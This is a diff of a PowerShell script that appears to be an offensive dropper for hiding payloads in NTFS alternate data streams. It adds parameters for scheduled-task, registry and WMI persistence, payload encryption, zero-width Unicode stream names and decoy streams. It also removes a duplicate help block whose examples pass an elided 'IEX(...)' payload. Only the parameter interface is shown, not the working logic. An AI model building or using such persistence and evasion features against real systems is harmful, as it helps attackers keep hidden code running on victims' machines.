@@ -142,14 +142,33 @@ Unauthorized use is illegal and unethical.
 
 [CmdletBinding()]
 param(
-    [Parameter(Mandatory=$false)][object]$Payload,
+    [Parameter(Mandatory=$false)]
+    [string]$Payload,
+    
+    [switch]$PayloadAtRuntime,
     [string[]]$Targets = @('localhost'),
-    [string[]]$Persist = @('task'),
+    
+    [ValidateSet('task', 'registry', 'wmi', 'none')]
+    [string]$Persist = 'task',
+    
     [switch]$Randomize,
     [switch]$Encrypt,
+    [switch]$ZeroWidthStreams,
+    
+    [ValidateSet('single', 'multi', 'hybrid')]
+    [string]$ZeroWidthMode = 'single',
+    
+    [string]$HybridPrefix,
+    
+    [ValidateRange(0, 10)]
+    [int]$CreateDecoys = 0,
+    
+    [string]$ManifestPath,
     [switch]$NoExec,
     [PSCredential]$Credential,
-    [switch]$Help
+    [switch]$Help,
+    
+    [switch]$GenerateOnly
 )
 
 # Help display function
@@ -207,89 +226,7 @@ if ($Help -or $args -contains '-h' -or $args -contains '--help' -or
     exit 0
 }
 
-# Main Code
-.SYNOPSIS
-    ADS-Dropper.ps1 - Consolidated NTFS Alternate Data Stream persistence framework
-
-.DESCRIPTION
-    All-in-one script for ADS-based persistence. No external dependencies.
-    Can be used directly on Windows or via Build-ADSOneLiner.ps1 generator.
-
-.PARAMETER Payload
-    The payload to deploy (scriptblock or string). Use -PayloadAtRuntime for deployment-time input.
-
-.PARAMETER PayloadAtRuntime
-    Prompt for payload at deployment time instead of baking it in.
-
-.PARAMETER Persist
-    Persistence method: 'task', 'registry', 'wmi', 'none'
-
-.PARAMETER Randomize
-    Enable randomized naming for streams and host files.
-
-.PARAMETER Encrypt
-    Enable AES-256 encryption of payload.
-
-.PARAMETER ZeroWidthStreams
-    Use zero-width Unicode characters for stream names.
-
-.PARAMETER ZeroWidthMode
-    Zero-width naming strategy: 'single', 'multi', 'hybrid'
-
-.PARAMETER HybridPrefix
-    Prefix for hybrid mode (default: auto-selected legitimate name)
-
-.PARAMETER CreateDecoys
-    Number of decoy ADS to create (0-10)
-
-.PARAMETER ManifestPath
-    Path to save manifest (Linux machine only, not on target)
-
-.PARAMETER NoExec
-    Deploy without executing (dry-run)
-
-.EXAMPLE
-    # Direct use on Windows
-    .\ADS-Dropper.ps1 -Payload "IEX(...)" -Persist task -Encrypt -ZeroWidthStreams
-
-.EXAMPLE
-    # Used by generator (Linux)
-    pwsh Build-ADSOneLiner.ps1 -Payload "IEX(...)" -ZeroWidthMode single
-
-.NOTES
-    Version: 2.0.0 (Consolidated)
-    Author: Qweary
-    All functions embedded - no external dependencies required
-#>
-
-[CmdletBinding()]
-param(
-    [Parameter(Mandatory=$false)]
-    [string]$Payload,
-
-    [switch]$PayloadAtRuntime,
-
-    [ValidateSet('task', 'registry', 'wmi', 'none')]
-    [string]$Persist = 'task',
-
-    [switch]$Randomize,
-    [switch]$Encrypt,
-    [switch]$ZeroWidthStreams,
-
-    [ValidateSet('single', 'multi', 'hybrid')]
-    [string]$ZeroWidthMode = 'single',
-
-    [string]$HybridPrefix,
-
-    [ValidateRange(0, 10)]
-    [int]$CreateDecoys = 0,
-
-    [string]$ManifestPath,
-
-    [switch]$NoExec,
-
-    [switch]$GenerateOnly  # NEW: Return configuration instead of executing
-)
+# Main Execution Logic Begins
 
 #region Zero-Width Unicode Functions
 
